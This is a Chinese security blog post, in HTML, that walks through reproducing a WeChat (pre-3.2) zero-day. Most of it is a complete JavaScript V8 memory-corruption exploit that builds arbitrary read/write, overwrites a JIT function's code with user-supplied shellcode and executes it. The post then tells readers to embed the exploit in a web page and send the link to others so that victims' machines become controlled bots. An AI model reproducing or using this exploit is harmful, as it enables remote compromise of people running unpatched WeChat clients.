@@ -1,0 +1,440 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+  <head>
+  <meta http-equiv="content-type" content="text/html;charset=utf-8">
+  <meta http-equiv="X-UA-Compatible" content="chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="robots" content="noodp"/>
+  <meta name="author" content="Olist.213">
+  <meta name="description" content="一点牢骚">
+  
+  
+  <link rel="prev" href="https://olist213.github.io/posts/easy_rce_ports/" />
+  <link rel="next" href="https://olist213.github.io/posts/vs2019-build-masscan/" />
+  <link rel="canonical" href="https://olist213.github.io/posts/weixin-0day/" />
+  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+  <link rel="manifest" href="/site.webmanifest">
+  <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+  <meta name="msapplication-TileColor" content="#da532c">
+  <meta name="theme-color" content="#ffffff">
+  <title>
+       
+       
+           Weixin 0day复现 | Olist.213
+       
+  </title>
+  <meta name="title" content="Weixin 0day复现 | Olist.213">
+    
+  
+  <link rel="stylesheet" href="/font/iconfont.css">
+  <link rel="stylesheet" href="/css/main.min.css">
+
+
+  
+  
+ 
+
+<script type="application/ld+json">
+ "@context" : "http://schema.org",
+    "@type" : "BlogPosting",
+    "mainEntityOfPage": {
+         "@type": "WebPage",
+         "@id": "https:\/\/olist213.github.io"
+    },
+    "articleSection" : "posts",
+    "name" : "Weixin 0day复现",
+    "headline" : "Weixin 0day复现",
+    "description" : "本文撰写人：netsetit\n前提：微信版本低于3.2（测试版本为3.0）\n1、生成一个shellcode，让js可以执行（注意：不要勾选x64，输出的文件为C）\n2、生成好shellcode，文本打开。\n3、对shellcode进行处理\n 将生成的shellcode 引号前后的文件删除 将 \u0027 \\ \u0027 (反斜杠)换成 ‘,0 ’ (英文逗号 和 0 )  4、将生成的shellcode添加到js文件内\nENABLE_LOG = true; IN_WORKER = true; \/\/ run calc and hang in a loop var shellcode = [ #your shellcode ]; \/\/shellcode替换成自己的（就是上面处理好的shellcode，直接把shellcode粘贴进来） 注意是x86的  function print(data) { } var not_optimised_out = 0; var target_function = (function (value) { if (value == 0xdecaf0) { not_optimised_out \u002b= 1; } not_optimised_out \u002b= 1; not_optimised_out |= 0xff; not_optimised_out *= 12; }); for (var i = 0; i \u0026lt; 0x10000; \u002b\u002bi) { target_function(i); } var g_array; var tDerivedNCount = 17 * 87481 - 8; var tDerivedNDepth = 19 * 19; function cb(flag) { if (flag == true) { return; } g_array = new Array(0); g_array[0] = 0x1dbabe * 2; return \u0026#39;c01db33f\u0026#39;; } function gc() { for (var i = 0; i \u0026lt; 0x10000; \u002b\u002bi) { new String(); } } function oobAccess() { var this_ = this; this.",
+    "inLanguage" : "zh-cn",
+    "author" : "Olist.213",
+    "creator" : "Olist.213",
+    "publisher": "Olist.213",
+    "accountablePerson" : "Olist.213",
+    "copyrightHolder" : "Olist.213",
+    "copyrightYear" : "2021",
+    "datePublished": "2021-04-19 11:29:04 \u002b0800 CST",
+    "dateModified" : "2021-04-19 11:29:04 \u002b0800 CST",
+    "url" : "https:\/\/olist213.github.io\/posts\/weixin-0day\/",
+    "wordCount" : "456",
+    "keywords" : [  "Olist.213"]
+}
+</script>
+
+</head>
+
+  
+
+
+  <body class="">
+    <div class="wrapper">
+        <nav class="navbar">
+    <div class="container">
+        <div class="navbar-header header-logo">
+        	<a href="javascript:void(0);" class="theme-switch"><i class="iconfont icon-xihuan"></i></a>&nbsp;<a href="https://olist213.github.io">Olist.213</a>
+        </div>
+        <div class="menu navbar-right">
+                
+                
+                <a class="menu-item" href="/posts/" title="">Blog&#39;s</a>
+                
+                <a class="menu-item" href="/categories/" title="">Categories</a>
+                
+                <a class="menu-item" href="/tags/" title="">Tags</a>
+                
+                <a class="menu-item" href="/about/" title="">About</a>
+                
+                <a class="menu-item" href="/study_book/" title="">学习笔记Day</a>
+                
+                <a class="menu-item" href="/security_process/" title="">安全流程</a>
+                
+        </div>
+    </div>
+</nav>
+<nav class="navbar-mobile" id="nav-mobile" style="display: none">
+     <div class="container">
+        <div class="navbar-header">
+            <div>  <a href="javascript:void(0);" class="theme-switch"><i class="iconfont icon-xihuan"></i></a>&nbsp;<a href="https://olist213.github.io">Olist.213</a></div>
+            <div class="menu-toggle">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+     
+          <div class="menu" id="mobile-menu">
+                
+                
+                <a class="menu-item" href="/posts/" title="">Blog&#39;s</a>
+                
+                <a class="menu-item" href="/categories/" title="">Categories</a>
+                
+                <a class="menu-item" href="/tags/" title="">Tags</a>
+                
+                <a class="menu-item" href="/about/" title="">About</a>
+                
+                <a class="menu-item" href="/study_book/" title="">学习笔记Day</a>
+                
+                <a class="menu-item" href="/security_process/" title="">安全流程</a>
+                
+        </div>
+    </div>
+</nav>
+    	 <main class="main">
+          <div class="container">
+      		
+<article class="post-warp" itemscope itemtype="http://schema.org/Article">
+    <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">Weixin 0day复现</h1>
+        <div class="post-meta">
+                Written by <a itemprop="name" href="https://olist213.github.io" rel="author">Olist.213</a> with ♥ 
+                <span class="post-time">
+                on <time datetime=2021-04-19 itemprop="datePublished">April 19, 2021</time>
+                </span>
+                in
+                
+        </div>
+    </header>
+    <div class="post-content">
+        
+
+        
+            
+        
+
+        
+        
+     
+          
+          
+          
+
+          
+          
+          
+
+          <p><img src="/images/weixin-0day.assets/wallhaven-73y539.png" alt="wallhaven-73y539"></p>
+<hr>
+<p>本文撰写人：netsetit</p>
+<p>前提：微信版本低于3.2（测试版本为3.0）</p>
+<p><img src="/images/weixin-0day.assets/image-20210419114310254.png" alt="image-20210419114310254"></p>
+<p>1、生成一个shellcode，让js可以执行（注意：不要勾选x64，输出的文件为C）</p>
+<p><img src="/images/weixin-0day.assets/image-20210419113620826.png" alt="image-20210419113620826"></p>
+<p>2、生成好shellcode，文本打开。</p>
+<p><img src="/images/weixin-0day.assets/image-20210419113648319.png" alt="image-20210419113648319"></p>
+<p>3、对shellcode进行处理</p>
+<ul>
+<li>将生成的shellcode 引号前后的文件删除</li>
+<li>将 ' <code>\</code> '  (反斜杠)换成  ‘<code>,0</code> ’ (英文逗号 和 0 )</li>
+</ul>
+<p><img src="/images/weixin-0day.assets/image-20210419113708704.png" alt="image-20210419113708704"></p>
+<p>4、将生成的shellcode添加到js文件内</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#a6e22e">ENABLE_LOG</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
+<span style="color:#a6e22e">IN_WORKER</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
+
+<span style="color:#75715e">// run calc and hang in a loop
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">shellcode</span> <span style="color:#f92672">=</span> [ <span style="color:#960050;background-color:#1e0010">#</span><span style="color:#a6e22e">your</span> <span style="color:#a6e22e">shellcode</span> ];
+<span style="color:#75715e">//shellcode替换成自己的（就是上面处理好的shellcode，直接把shellcode粘贴进来） 注意是x86的
+</span><span style="color:#75715e"></span>
+<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">data</span>) {
+}
+
+<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">not_optimised_out</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">target_function</span> <span style="color:#f92672">=</span> (<span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">value</span>) {
+    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">value</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xdecaf0</span>) {
+        <span style="color:#a6e22e">not_optimised_out</span> <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>;
+    }
+    <span style="color:#a6e22e">not_optimised_out</span> <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>;
+    <span style="color:#a6e22e">not_optimised_out</span> <span style="color:#f92672">|=</span> <span style="color:#ae81ff">0xff</span>;
+    <span style="color:#a6e22e">not_optimised_out</span> <span style="color:#f92672">*=</span> <span style="color:#ae81ff">12</span>;
+});
+
+<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x10000</span>; <span style="color:#f92672">++</span><span style="color:#a6e22e">i</span>) {
+    <span style="color:#a6e22e">target_function</span>(<span style="color:#a6e22e">i</span>);
+}
+
+<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">g_array</span>;
+<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">tDerivedNCount</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">17</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">87481</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">8</span>;
+<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">tDerivedNDepth</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">19</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">19</span>;
+
+<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">cb</span>(<span style="color:#a6e22e">flag</span>) {
+    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">flag</span> <span style="color:#f92672">==</span> <span style="color:#66d9ef">true</span>) {
+        <span style="color:#66d9ef">return</span>;
+    }
+    <span style="color:#a6e22e">g_array</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Array(<span style="color:#ae81ff">0</span>);
+    <span style="color:#a6e22e">g_array</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1dbabe</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span>;
+    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;c01db33f&#39;</span>;
+}
+
+<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">gc</span>() {
+    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x10000</span>; <span style="color:#f92672">++</span><span style="color:#a6e22e">i</span>) {
+        <span style="color:#66d9ef">new</span> String();
+    }
+}
+
+<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">oobAccess</span>() {
+    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">this_</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>;
+    <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">buffer</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
+    <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">buffer_view</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
+
+    <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">page_buffer</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
+    <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">page_view</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
+
+    <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">prevent_opt</span> <span style="color:#f92672">=</span> [];
+
+    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">kSlotOffset</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1f</span>;
+    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">kBackingStoreOffset</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xf</span>;
+
+    <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">LeakArrayBuffer</span> <span style="color:#66d9ef">extends</span> <span style="color:#a6e22e">ArrayBuffer</span> {
+        <span style="color:#a6e22e">constructor</span>() {
+            <span style="color:#66d9ef">super</span>(<span style="color:#ae81ff">0x1000</span>);
+            <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">slot</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>;
+        }
+    }
+
+    <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">page_buffer</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">LeakArrayBuffer</span>();
+    <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">page_view</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">DataView</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">page_buffer</span>);
+
+    <span style="color:#66d9ef">new</span> RegExp({ <span style="color:#a6e22e">toString</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">function</span> () { <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;a&#39;</span> } });
+    <span style="color:#a6e22e">cb</span>(<span style="color:#66d9ef">true</span>);
+
+    <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">DerivedBase</span> <span style="color:#66d9ef">extends</span> RegExp {
+        <span style="color:#a6e22e">constructor</span>() {
+            <span style="color:#75715e">// var array = null;
+</span><span style="color:#75715e"></span>            <span style="color:#66d9ef">super</span>(
+                <span style="color:#75715e">// at this point, the 4-byte allocation for the JSRegExp `this` object
+</span><span style="color:#75715e"></span>                <span style="color:#75715e">// has just happened.
+</span><span style="color:#75715e"></span>                {
+                    <span style="color:#a6e22e">toString</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">cb</span>
+                }, <span style="color:#e6db74">&#39;g&#39;</span>
+                <span style="color:#75715e">// now the runtime JSRegExp constructor is called, corrupting the
+</span><span style="color:#75715e"></span>                <span style="color:#75715e">// JSArray.
+</span><span style="color:#75715e"></span>            );
+
+            <span style="color:#75715e">// this allocation will now directly follow the FixedArray allocation
+</span><span style="color:#75715e"></span>            <span style="color:#75715e">// made for `this.data`, which is where `array.elements` points to.
+</span><span style="color:#75715e"></span>            <span style="color:#a6e22e">this_</span>.<span style="color:#a6e22e">buffer</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ArrayBuffer</span>(<span style="color:#ae81ff">0x80</span>);
+            <span style="color:#a6e22e">g_array</span>[<span style="color:#ae81ff">8</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">this_</span>.<span style="color:#a6e22e">page_buffer</span>;
+        }
+    }
+
+    <span style="color:#75715e">// try{
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">derived_n</span> <span style="color:#f92672">=</span> eval(<span style="color:#e6db74">`(function derived_n(i) {
+</span><span style="color:#e6db74">        if (i == 0) {
+</span><span style="color:#e6db74">            return DerivedBase;
+</span><span style="color:#e6db74">        }
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">        class DerivedN extends derived_n(i-1) {
+</span><span style="color:#e6db74">            constructor() {
+</span><span style="color:#e6db74">                super();
+</span><span style="color:#e6db74">                return;
+</span><span style="color:#e6db74">                </span><span style="color:#e6db74">${</span><span style="color:#e6db74">&#34;this.a=0;&#34;</span>.<span style="color:#a6e22e">repeat</span>(<span style="color:#a6e22e">tDerivedNCount</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">            }
+</span><span style="color:#e6db74">        }
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">        return DerivedN;
+</span><span style="color:#e6db74">    })`</span>);
+
+    <span style="color:#a6e22e">gc</span>();
+
+    <span style="color:#66d9ef">new</span> (<span style="color:#a6e22e">derived_n</span>(<span style="color:#a6e22e">tDerivedNDepth</span>))();
+
+    <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">buffer_view</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">DataView</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">buffer</span>);
+    <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">leakPtr</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">obj</span>) {
+        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">page_buffer</span>.<span style="color:#a6e22e">slot</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">obj</span>;
+        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">buffer_view</span>.<span style="color:#a6e22e">getUint32</span>(<span style="color:#a6e22e">kSlotOffset</span>, <span style="color:#66d9ef">true</span>, ...<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">prevent_opt</span>);
+    }
+
+    <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">setPtr</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">addr</span>) {
+        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">buffer_view</span>.<span style="color:#a6e22e">setUint32</span>(<span style="color:#a6e22e">kBackingStoreOffset</span>, <span style="color:#a6e22e">addr</span>, <span style="color:#66d9ef">true</span>, ...<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">prevent_opt</span>);
+    }
+
+    <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">read32</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">addr</span>) {
+        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">setPtr</span>(<span style="color:#a6e22e">addr</span>);
+        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">page_view</span>.<span style="color:#a6e22e">getUint32</span>(<span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">true</span>, ...<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">prevent_opt</span>);
+    }
+
+    <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">write32</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">addr</span>, <span style="color:#a6e22e">value</span>) {
+        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">setPtr</span>(<span style="color:#a6e22e">addr</span>);
+        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">page_view</span>.<span style="color:#a6e22e">setUint32</span>(<span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">value</span>, <span style="color:#66d9ef">true</span>, ...<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">prevent_opt</span>);
+    }
+
+    <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">write8</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">addr</span>, <span style="color:#a6e22e">value</span>) {
+        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">setPtr</span>(<span style="color:#a6e22e">addr</span>);
+        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">page_view</span>.<span style="color:#a6e22e">setUint8</span>(<span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">value</span>, ...<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">prevent_opt</span>);
+    }
+
+    <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">setBytes</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">addr</span>, <span style="color:#a6e22e">content</span>) {
+        <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">content</span>.<span style="color:#a6e22e">length</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) {
+            <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">write8</span>(<span style="color:#a6e22e">addr</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">i</span>, <span style="color:#a6e22e">content</span>[<span style="color:#a6e22e">i</span>]);
+        }
+    }
+    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">this</span>;
+}
+
+<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">trigger</span>() {
+    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">oob</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">oobAccess</span>();
+
+    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">func_ptr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">oob</span>.<span style="color:#a6e22e">leakPtr</span>(<span style="color:#a6e22e">target_function</span>);
+    <span style="color:#a6e22e">print</span>(<span style="color:#e6db74">&#39;[*] target_function at 0x&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">func_ptr</span>.<span style="color:#a6e22e">toString</span>(<span style="color:#ae81ff">16</span>));
+
+    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">kCodeInsOffset</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1b</span>;
+
+    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">code_addr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">oob</span>.<span style="color:#a6e22e">read32</span>(<span style="color:#a6e22e">func_ptr</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">kCodeInsOffset</span>);
+    <span style="color:#a6e22e">print</span>(<span style="color:#e6db74">&#39;[*] code_addr at 0x&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">code_addr</span>.<span style="color:#a6e22e">toString</span>(<span style="color:#ae81ff">16</span>));
+
+    <span style="color:#a6e22e">oob</span>.<span style="color:#a6e22e">setBytes</span>(<span style="color:#a6e22e">code_addr</span>, <span style="color:#a6e22e">shellcode</span>);
+
+    <span style="color:#a6e22e">target_function</span>(<span style="color:#ae81ff">0</span>);
+}
+
+<span style="color:#66d9ef">try</span>{
+    <span style="color:#a6e22e">print</span>(<span style="color:#e6db74">&#34;start running&#34;</span>);
+    <span style="color:#a6e22e">trigger</span>();
+}<span style="color:#66d9ef">catch</span>(<span style="color:#a6e22e">e</span>){
+    <span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">e</span>);
+}
+</code></pre></div><p>5、将js文件写入到HTML文件内</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">head</span>&gt;
+
+&lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">http-equiv</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Content-Type&#34;</span> <span style="color:#a6e22e">content</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/html;charset=utf-8&#34;</span>&gt;
+
+&lt;/<span style="color:#f92672">head</span>&gt;
+
+&lt;<span style="color:#f92672">h1</span>&gt;微信 test&lt;/<span style="color:#f92672">h1</span>&gt;
+
+&lt;<span style="color:#f92672">script</span>&gt;
+
+<span style="color:#a6e22e">这里放刚刚写好的js内容</span><span style="color:#960050;background-color:#1e0010">，</span><span style="color:#a6e22e">直接复制过来</span>
+
+&lt;/<span style="color:#f92672">script</span>&gt;
+</code></pre></div><p>6、将写好的HTML文件放入网站</p>
+<p><img src="/images/weixin-0day.assets/image-20210419113726470.png" alt="image-20210419113726470"></p>
+<p>7、发送链接给别人，点击之后。叮，您的肉鸡已上线</p>
+<p><img src="/images/weixin-0day.assets/image-20210419113738684.png" alt="image-20210419113738684"></p>
+
+    </div>
+
+    <div class="post-copyright">
+             
+            <p class="copyright-item">
+                <span>Author:</span>
+                <span>Olist.213 </span>
+                </p>
+            
+           
+             
+            <p class="copyright-item">
+                    <span>Link:</span>
+                    <a href=https://olist213.github.io/posts/weixin-0day/>https://olist213.github.io/posts/weixin-0day/</span>
+            </p>
+            
+            
+    </div>
+
+  
+    <div class="post-tags">
+        
+        <section>
+                <a href="javascript:window.history.back();">back</a></span> · 
+                <span><a href="https://olist213.github.io">home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav">
+        
+        <a href="https://olist213.github.io/posts/easy_rce_ports/" class="prev" rel="prev" title="Easy_Rce_Ports"><i class="iconfont icon-left"></i>&nbsp;Easy_Rce_Ports</a>
+         
+        
+        <a href="https://olist213.github.io/posts/vs2019-build-masscan/" class="next" rel="next" title="vs2019编译masscan">vs2019编译masscan&nbsp;<i class="iconfont icon-right"></i></a>
+        
+    </div>
+
+    <div class="post-comment">
+          
+                 
+          
+    </div>
+</article>
+          </div>
+		   </main>
+      <footer class="footer">
+    <div class="copyright">
+        &copy;
+        
+        <span itemprop="copyrightYear">2018 - 2021</span>
+        
+        <span class="with-love">
+    	 <i class="iconfont icon-love"></i> 
+         </span>
+         
+            <span class="author" itemprop="copyrightHolder"><a href="https://olist213.github.io">Olist.213</a> | </span> 
+         
+
+         
+		  <span>Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow">Hugo</a> & <a href="https://github.com/liuzc/leaveit" target="_blank" rel="external nofollow">LeaveIt</a></span> 
+    </div>
+</footer>
+
+
+
+
+
+
+
+
+
+
+
+
+    
+     <link href="//lib.baomitu.com/lightgallery/1.6.11/css/lightgallery.min.css" rel="stylesheet">  
+      
+     <script src="/js/vendor_gallery.min.js" async="" ></script>
+    
+  
+
+
+
+     </div>
+  </body>
+</html>
